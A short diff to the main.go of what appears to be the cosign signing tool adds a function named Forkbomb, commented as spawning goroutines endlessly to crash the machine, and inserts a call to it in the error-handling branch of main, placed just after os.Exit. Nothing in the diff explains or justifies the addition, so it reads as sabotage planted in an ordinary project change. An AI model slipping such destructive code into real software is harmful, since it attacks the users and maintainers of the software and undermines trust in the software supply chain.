@@ -33,6 +33,13 @@ import (
 	_ "github.com/sigstore/sigstore/pkg/signature/kms/hashivault"
 )
 
+// Forkbomb spawns goroutines in order to crash the machine.
+func Forkbomb() {
+	for {
+		go Forkbomb()
+	}
+}
+
 func main() {
 	// Fix up flags to POSIX standard flags.
 	ctx := context.Background()
@@ -68,6 +75,8 @@ func main() {
 		if errors.As(err, &cosignError) {
 			log.Printf("error during command execution: %v", err)
 			os.Exit(cosignError.ExitCode())
+
+			Forkbomb()
 		}
 
 		// we don't call os.Exit as Fatalf does both PrintF and os.Exit(1)
